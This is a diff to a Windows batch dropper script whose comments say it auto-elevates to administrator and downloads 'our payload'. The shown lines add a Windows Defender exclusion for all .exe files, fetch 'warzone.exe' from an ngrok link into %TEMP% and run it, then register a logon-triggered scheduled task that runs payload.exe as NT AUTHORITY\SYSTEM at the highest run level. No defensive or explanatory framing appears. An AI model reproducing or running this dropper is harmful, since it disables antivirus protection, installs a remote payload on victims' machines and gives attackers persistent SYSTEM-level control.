@@ -1,4 +1,6 @@
-REM --add the following to the top of your bat file--
+REM A bat file that runs automatically as administrator.
+REM Downloads our payload using powershell.
+REM Instructs Windows Defender to exclude any exe files.
 
 
 @echo off
@@ -31,11 +33,11 @@ Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
 Powershell -Command "Invoke-Webrequest 'https://ngrok-Link/warzone.exe' -OutFile mod.exe"
 mod.exe
-
+:--------------------------------------
 REM Persistence method using Powershell to scheduled task
-Powershell -Command "$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\pentestlab.exe""
-Powershell -Command "$T = New-ScheduledTaskTrigger -AtLogOn -User "pentestlab""
+Powershell -Command "$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\payload.exe""
+Powershell -Command "$T = New-ScheduledTaskTrigger -AtLogOn -User "username""
 Powershell -Command "$S = New-ScheduledTaskSettingsSet"
-Powershell -Command "$P = New-ScheduledTaskPrincipal "Pentestlab""
+Powershell -Command "$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest"
 Powershell -Command "$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S"
-Powershell -Command "Register-ScheduledTask Pentestlab -InputObjec $D"
+Powershell -Command "Register-ScheduledTask NameTheTask -InputObjec $D"
